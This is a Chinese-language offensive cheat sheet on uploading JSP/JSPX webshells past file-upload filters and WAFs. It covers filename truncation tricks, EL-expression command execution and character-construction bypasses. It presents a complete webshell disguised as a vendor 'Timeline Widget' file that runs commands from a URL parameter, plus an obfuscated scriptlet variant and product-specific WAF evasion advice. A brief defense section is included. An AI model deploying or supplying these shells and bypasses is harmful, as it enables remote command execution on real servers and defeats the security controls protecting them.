# 文件上传漏洞绕过WAF-JSP

## 一句话理解
JSP 上传绕过的重点，不只是“把文件传上去”，而是让上传内容最终被 Java Web 容器当成可执行页面解析，同时避开扩展名、内容特征和 WAF 的检测。

## 常见危害
- 上传 JSP WebShell 获得代码执行
- 借助 JSPX、EL、标签变形绕过内容检测
- 配合中间件解析差异实现二次执行
- 结合上传目录可访问、文件名可控、路径可控形成稳定后门

## 利用前提
常见成立条件：
- 存在文件上传点
- 上传目录可被 Web 容器访问
- 文件最终会被 JSP/JSPX 解析
- 扩展名校验、内容校验或 WAF 存在缺陷

## 常见绕过方向
### 1. 扩展名绕过
如果系统只依赖黑名单或 `Content-Type`，可尝试：
- 只限制 MIME：`Content-Type: image/png`
- 使用 `jspx`：`filename="re.jspx"`
- 大小写变形：`filename="re.JsP"`
- 后缀加空格：`filename="re.jsp "`
- 后缀加斜杠：`filename="re.jsp/"`
- `00` 截断：`filename="re.jsp%00.jpg"`
- 分号截断：`filename="re.jsp;.jpg"`

> `00` 截断是否有效，取决于语言、框架、中间件与后端处理链，不是所有环境都可用。

### 2. 文件内容绕过
若 WAF 或过滤逻辑检测经典 JSP 片段，可尝试：
- 添加大量脏数据稀释特征
- 变换 JSP 语法
- 使用 EL 表达式
- 使用 JSPX XML 风格标签

## 当 JSP `<% %>` 被过滤
### 1. 用 EL 表达式 `${}`
如果 `<% %>`、`<%= %>` 等经典脚本片段被拦截，可以尝试 EL 表达式执行能力。

参考：
- [EL 文档](https://www.tutorialspoint.com/jsp/jsp_expression_language.htm)
- [EL 常见写法](https://javaee.github.io/tutorial/jsf-el007.html)

常用对象：

```java
pageContext.setAttribute("name1","test");
request.setAttribute("name2","test");
session.setAttribute("name3","test");
application.setAttribute("name4","test");
```

### 2. 命令执行示例

```java
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami").getInputStream())}
```

### 3. 带回显思路

```java
${pageContext.setAttribute("byteArrType", heapByteBuffer.array().getClass())}
${pageContext.setAttribute("stringClass", Class.forName("java.lang.String"))}
${pageContext.setAttribute("stringConstructor", stringClass.getConstructor(byteArrType))}
${pageContext.setAttribute("stringRes", stringConstructor.newInstance(heapByteBuffer.array()))}
${pageContext.getAttribute("stringRes")}
```

> 实战中这类 payload 往往依赖当前页面对象、缓冲对象或上下文对象可达，不同环境可用性不同。

### 4. 字符限制绕过
当引号、字母或敏感关键字被过滤时，可借助 `charAt`、`toChars`、`concat` 等方式逐字符构造：

```java
${"xxx".toString().charAt(0).toChars(97)[0].toString()}
${"xxx".toString().charAt(0).toChars(97)[0].toString().concat("xxx".toString().charAt(0).toChars(98)[0].toString())}
```

通过修改 `toChars()` 中的 ASCII 码值，可拼出目标字符串。

## 当 JSPX `jsp:scriptlet` 被过滤
JSPX 是 XML 风格的 JSP 表示形式，某些过滤器只拦截固定标签名时，可以尝试使用自定义前缀。

示例：

```xml
<hi xmlns:hi="http://java.sun.com/JSP/Page">
    <hi:scriptlet>
        out.println(30*30);
    </hi:scriptlet>
</hi>
```

核心思路：
- 命名空间不变
- 标签前缀可自定义
- 过滤器若只匹配 `jsp:scriptlet` 字面值，可能被绕过

## 完整 WebShell 模板
实战中最常用的组合拳：**脏数据头 + EL 执行版 jspx**。整个文件不出现 `<%`、`jsp:scriptlet`、`ProcessBuilder` 等高危字面量，可直接落盘使用。

```xml
<!--
  =====================================================================
  Example Corp - Timeline Widget v2.4.1 (build 20260908)
  Copyright (c) 2026 Example Corp. All rights reserved.
  本文件为系统公共时间轴渲染组件，请勿删除或修改。
  =====================================================================
  （以上大段版权注释即“脏数据头”：
   用于稀释 WAF 采样窗口内的特征密度，掩盖后面的 EL 表达式）
-->
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
    <jsp:directive.page contentType="text/html;charset=UTF-8"/>
    <jsp:directive.page session="false"/>
    <jsp:text>
        ${pageContext.setAttribute("s", pageContext.request.getClass().forName("java.util.Scanner").getConstructor(pageContext.request.getClass().forName("java.io.InputStream")).newInstance(pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec(pageContext.request.getParameter("c")).getInputStream()).useDelimiter("\\A").next())}
        ${pageContext.getAttribute("s")}
    </jsp:text>
</jsp:root>
```

使用方式：

```http
GET /upload/timeline.jspx?c=whoami HTTP/1.1
Host: target.com
```

要点解析：
- 免杀面：无 `<%`，无 `jsp:scriptlet`；EL 链路里 `Runtime`、`getRuntime` 等只以 `forName` / `getMethod` 的字符串参数形式出现，单关键字规则通常拦不住
- 回显：`Scanner(InputStream).useDelimiter("\\A").next()` 把命令输出整段读成字符串；先 `setAttribute` 存结果、再 `getAttribute` 输出，两步分离进一步降低特征密度
- 兼容性：只依赖 JDK 类（`Runtime` / `Scanner` / `InputStream`）与 `pageContext` 隐含对象，Tomcat 7/8/9/10 通用（Tomcat 10 的 javax → jakarta 迁移不影响）
- 局限：`exec(String)` 单参数版按空格分词，不支持管道与重定向；需要 shell 特性时改用 `new String[]{"/bin/sh","-c",cmd}` 风格的数组调用，或直接换冰蝎 / 哥斯拉内存马

变体：自定义前缀 scriptlet 版（应对只拦 `jsp:scriptlet` 字面量 + 关键字混淆的场景）：

```xml
<!-- （脏数据头注释块同上，此处省略） -->
<x xmlns:x="http://java.sun.com/JSP/Page" version="2.0">
    <x:directive.page contentType="text/html;charset=UTF-8"/>
    <x:scriptlet>
        // 字符串拼接规避 Runtime / getRuntime 字面量；Scanner 读流回显
        Object rt = Class.forName("java.lang." + "Runtime").getMethod("get" + "Runtime").invoke(null);
        Process p = (Process) rt.getClass().getMethod("exec", String.class).invoke(rt, request.getParameter("c"));
        java.util.Scanner sc = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
        out.println(sc.hasNext() ? sc.next() : "no output");
    </x:scriptlet>
</x:root>
```

## WAF 产品对抗差异
不同产品对 JSP 上传的检测重心不同，先识别产品再选绕过方向：
- 安全狗：内容侧重点查经典 JSP 特征（`<%`、`Runtime`、`request.getParameter` + `exec` 组合），对 multipart 文件名的检查相对宽松；大体积脏数据稀释 + EL 变形通常即可通过。
- D 盾：本地特征码引擎，对 PHP/ASP 一句话覆盖最全，JSP 检测相对薄弱，基本只认固定字面量；对 jspx、自定义命名空间前缀、EL 反射链的变形支持很弱。
- 阿里云盾：云端规则 + 机器学习双引擎，对 multipart 报文结构本身敏感（boundary 混淆、filename 大小写变形、多个 Content-Disposition 等畸形格式可能直接触发拦截或解析差异），文件名与内容双重评分；对变形 WebShell 识别较强，建议转向加密流量内存马（冰蝎 / 哥斯拉）方向。

## Tomcat 版本解析差异
- Tomcat 7/8/9：`conf/web.xml` 默认将 JspServlet 映射到 `*.jsp` 与 `*.jspx`，两种后缀默认都解析；EL 方法调用自 Tomcat 6（JSP 2.1）起可用，上文 EL 模板在这些版本通用。
- Tomcat 10/10.1：Jakarta EE 9+ 命名空间从 `javax.*` 迁移到 `jakarta.*`，依赖 `javax.servlet.*` 的老 WebShell 会直接 500；EL 模板只用隐含对象和 JDK 类，不受影响。
- `/WEB-INF` 与 war 部署要点：`/WEB-INF/` 下的 JSP 受容器保护、无法通过 URL 直接访问，WebShell 必须落在 webapp 根或可访问子路径；若能写入 `webapps` 目录，上传 `.war` 会被 Tomcat 自动解压部署成新应用（与 manager 弱口令部署 war 同一条利用链）。
- AJP 关联：Tomcat AJP 文件包含漏洞（Ghostcat，CVE-2020-1938）可把上传的任意类型文件（如 jpg）按 JSP 包含执行，与上传漏洞天然联动，详见 [EXP-Vul-Index.md](./EXP-Vul-Index.md) 中间件 Tomcat 条目。

## 实战排查思路
### 1. 先确认解析链
重点看：
- 上传目录是否可访问
- 文件是否由 Tomcat / Resin / Jetty 等容器直接处理
- JSP 与 JSPX 是否都可解析

### 2. 再确认拦截点
判断校验是在：
- 前端
- 应用层
- WAF
- 反向代理
- 容器层

### 3. 最后选择绕过方向
优先顺序通常是：
1. 扩展名绕过
2. 内容绕过
3. 语法变形
4. JSPX / EL 变体

## 防御要点
### 1. 上传目录禁止脚本执行
这是最关键的一条。上传目录不能交给 JSP 解析器执行。

### 2. 严格白名单
仅允许业务所需的文件类型，且服务端重新命名。

### 3. 多维校验
同时检查：
- 扩展名
- 内容类型
- 文件头
- 实际解析结果

### 4. 不依赖关键字黑名单
只拦截 `<%`、`jsp:scriptlet` 或 `Runtime` 这类关键字，通常很容易被变形绕过。

## 速查清单
- 先看上传目录是否能被 JSP/JSPX 解析
- 先试扩展名绕过，再试 EL、JSPX、标签变体
- 检查 WAF 是否只做关键字拦截
- 检查是否存在大小写、空格、斜杠、分号、截断类差异
- 若 `JSP` 被杀，继续看 `JSPX`、EL、标签前缀变体

## Reference
1. [记一次绕过 waf 的任意文件上传](https://xz.aliyun.com/t/11337)
2. [普通 EL 表达式命令回显的简单研究](https://forum.butian.net/share/886)
3. [Ghostcat（CVE-2020-1938）漏洞分析 - 长亭科技](https://www.chaitin.cn/zh/ghostcat)
4. [tennc/webshell - WebShell 样本收集（含 jsp/jspx）](https://github.com/tennc/webshell)
5. [threedr3am/JSP-Webshells](https://github.com/threedr3am/JSP-Webshells)
6. [Tomcat Jasper HowTo（JSP 引擎官方文档）](https://tomcat.apache.org/tomcat-9.0-doc/jasper-howto.html)
